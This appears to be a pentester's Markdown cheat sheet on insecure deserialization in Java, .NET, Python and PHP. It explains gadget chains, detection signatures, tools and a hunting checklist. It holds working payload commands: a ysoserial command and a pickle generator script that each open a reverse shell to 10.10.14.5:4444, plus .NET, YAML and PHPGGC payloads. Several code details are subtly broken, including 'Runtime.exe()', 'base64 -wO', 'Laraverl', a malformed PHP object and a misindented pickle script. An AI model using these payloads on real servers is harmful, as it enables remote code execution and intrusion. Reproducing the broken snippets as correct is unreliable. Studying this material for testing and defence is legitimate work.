# Insecure Deserialization

## Description
Serialization is the process of converting an aobject in memory (with its variables and state) into a data format (binary, JSON, XML) to save it to disk or send it over the network. Deserialization is the reverse process: taking that data and reconstructing the object in the server's memory.

The vulnerability occurs when the application deserializes user-controlled data without validating it. Instead of sending a harmless object (such as a user profile), the attacker sends a "poisoned" object that when reconstructed by the server, executes malicious code.

---

## The Attack Engine: Gadgets and Gadgets Chains

To achieve Remote Command Execution (RCE) through deserialization, we rarely write our own executable code directly. We use what's already on the server.


* **Gadget:** A gadget is a piecce of code (a class or funtion) that already exists within the application or its libraries (such as Apache Commons Collections or Spring). A gadget on its own is usally harmlless.

* **Gadget Chain:** This is the art of chaining multple gadget together. It works like a Rube Goldberg machine: The attacker injects Object A -> The server destroys Object A by calling a *Magic Method* -> THis triggers Object B -> Which calls Object C -> Which finally lands in a dangerous *Sink* like `Runtime.exe()` or `system()`.

---

## Java Deserialization

Java is historically the king of this vulnerability. It occurs when the server uses `ObjectInputStream.readObject()` with data from the attacker.

* **Signarute (How to detect it):** Base64-encoded Java objects almost always begin with `rO0...`. In binary (Hex), they begin with the Magic Bytes `AC ED 00 05`.

* **Magic Methods:** The attack usually triggers when the server automatically invokes methods like `readObject()`, `readResolve()`, or `finalize()` during or immediately after object reconstruction.

* **The Tool (ysoserial):** It is a collection of Gadget Chains discovered in common Java libraries.

* **Example of use:** If you know the server uses `CommonsCollections1`, you generate your payload like this:

```bash
java -jar ysoserial.jar CommonsCollections1 'bash -c "bash -i >&/dev/tcp/10.10.14.5/4444 0>&1"' | base64 -wO
```

* Then you send that Base64 string in the cookie or vulnerable parameter.

---

## .NET Deserialization

SImilar to Java, but in the Microsoft exosystem. It occurs with insecure formatters such as `BinaryFormatter`, `NetDataContractSerializer`, or vulnerable `JSON.NET` configurations.

* **Signature (How to detect it):** In Base64, objects serialized with BinaryFormatter often begin with `AAEAAAD/////`.

* **The Tool (ysoserial.net):** The windows equivalent. Generates payloads based on .NET Gadget Chains.

* **Example of use:** Generate a payload for `TypeConfuseDelegate` that executes a calculator (or a shell):

``` powershell
.\yoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe"
```

---

## Python (Pickle & YAML)

In Python, unsafe deserialization is brutally straightforward. You don't need complex gadget strings because the language itself allows you to inject the code to be executed when reconstructing the object.

### 1. Pickle (`pickle.loads()`)

The `pickle` module is native to Python. To exploit it we abuse the magic method `__reduce__()`, which tells Python: *"When you reconstruct this object, execute this function with these arguments"*.

* **Payload Generator Script:**
```Python
import pickle
import os
import base64

class Malicious(object):
    def __reduce__(self):
        # Your RCE goes here
        return (os.system, ('nc -e /bin/sh 10.10.14.5 4444',))

    payload = base64.b64encode(pickle.dumps(Malicious()))
    print(payload)
```

### 2. YAML (`yaml.load()`)

If an application uses PyYAML and calls `yaml.load()` (instead of the safe version `yaml.safe_load()`), it's possible to inject Python-specific tags to execute system commands.

* **Payload YAML:**
```YAML
!!python/object/apply:os.system["id"]
```
---

## PHP Deserialization (Object Injection)

This occurs when the application passes user input to the `unserialize()` function.

* **Signature (How to Detect It):** Serialized objects in PHP are structured plain text. They look like this: `O:4"User":2:{s:8:"username";s:5:"admin";}` (A user class object with two properties...).

* **Magic Methods:** RCE is achieved by abusing methods that PHP automatically calls when destroying or waking up the object:

* `__destruct()`: Called when the script ends and the object is removed from memory.

* `__wakeup()`: Called immediately upon unserialization.

* `__toString()`: Called if the object is treated as a string (eg., `echo $object`).

* **The Tool (PHPGGC - PHP Generic Gadget Chains):** It's the `ysoserial` of PHP. It allows you to generate payloads for common frameworks like Laravel, Symfony, or CodeIgniter.

* **Example of use:**

```bash
./phpggc Laraverl/RCE1 system "id"
```

---

## Hunting and Exploitation Checklist

- [] Analyze cookies, session tokens, and hidden parameters for Base64 strings.
- [] Decode the Base64 and identify the language by its signarute (`rO0` = Java, `AAEAA` = .NET, `O:4` = PHP).
- [] Identify if JSON is used but with class type metadata (ex. `"$type":"System.Windows.Data.ObjectDataProvider"` in .NET).

- [] Use the appropriate tool (`ysoserial`, `PHPGGC`, `pickle` script) to generate the gadget string corresponding to the target server framework.


